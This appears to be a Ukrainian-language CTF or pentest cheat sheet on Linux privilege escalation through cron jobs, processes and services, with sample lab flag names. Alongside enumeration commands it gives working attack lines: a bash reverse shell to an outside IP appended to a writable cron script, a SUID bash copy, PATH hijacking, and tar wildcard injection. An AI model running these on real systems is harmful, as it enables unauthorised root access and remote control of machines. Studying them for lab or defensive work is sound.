# Technique: Cron Jobs / Processes / Services

**Навіщо:** заплановані завдання та сервіси часто виконуються від іншого юзера й чіпають файли з доступом на запис → доступ/флаг.
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [lateral-movement](../02-workflows/lateral-movement.md)

---

## Знайти cron
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l                    # мій
cat /var/spool/cron/crontabs/* 2>/dev/null   # інших (якщо читабельно)
```
Без рута crontab інших не видно напряму → **pspy** (моніторинг процесів без прав):
```bash
./pspy64            # покаже, що і від кого запускається за розкладом
```
→ залити: [file-transfer](../02-workflows/file-transfer.md)

## Що шукати у cron
| Знахідка | Можливість |
|---|---|
| Скрипт від user2 доступний на **редагування** | дописана команда виконається від user2 |
| Скрипт викликає інший файл за відносним шляхом / wildcard | підміна/wildcard injection |
| Скрипт читає/пише у директорію з доступом на запис | підкласти свій файл |
| У команді cron видно пароль/токен | пряме credential reuse |

```bash
# чи можу писати у скрипт, що крутиться в cron?
ls -la /path/to/cronned_script.sh
find / -writable -name '*.sh' 2>/dev/null
```

## Готові команди експлуатації
```bash
# 1) cron-скрипт доступний на запис → дописати reverse shell (спрацює від власника cron):
echo 'bash -i >& /dev/tcp/10.8.N.x/4444 0>&1' >> /path/cronned.sh
#    або SUID-копію bash, якщо cron від root:
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' >> /path/cronned.sh   # потім: /tmp/b -p

# 2) PATH hijack: cron викликає команду без повного шляху (напр. "backup"), а
#    записувана тека стоїть першою в PATH cron → підкласти свій "backup":
printf '#!/bin/sh\ncp /bin/bash /tmp/b; chmod +s /tmp/b\n' > /writable/backup
chmod +x /writable/backup

# 3) tar wildcard injection: cron від root робить `tar czf bk.tgz *` у записуваній теці:
cd /writable_dir
printf '#!/bin/sh\ncp /bin/bash /tmp/b; chmod +s /tmp/b\n' > runme.sh; chmod +x runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
#    tar сприйме ці імена як прапорці → виконає runme.sh від root
```

## Процеси / сервіси
```bash
ps aux                       # хто що запустив (паролі в аргументах!)
ps aux | grep -i -E 'mysql|apache|python|node'
ss -tlnp                     # внутрішні сервіси → pivoting
systemctl list-units --type=service --state=running 2>/dev/null
```
Цінне: сервіс від іншого юзера з конфігом, доступним на читання/запис; пароль у командному рядку процесу; внутрішній додаток на localhost ([pivoting](../02-workflows/pivoting-portforward.md)).

## Логіка використання
Шукати: **«щось привілейоване (root/інший юзер) регулярно чіпає щось з доступом на запис»** → дописати команду → виконання від того юзера. Якщо cron від **root** — це прямий шлях до root (SUID-копія bash / reverse shell). Зразки прапорців: `cr0n_j0b_t0k3n`, `cr0n_scr1pt_s0urc3`.

## Пастки
- Почекати цикл cron (1–5 хв) перед висновком «не спрацювало».
- Сервіси не ламати й не видаляти (правила) — лише читання/використання.
- pspy показує й короткоживучі процеси, яких `ps` не ловить.
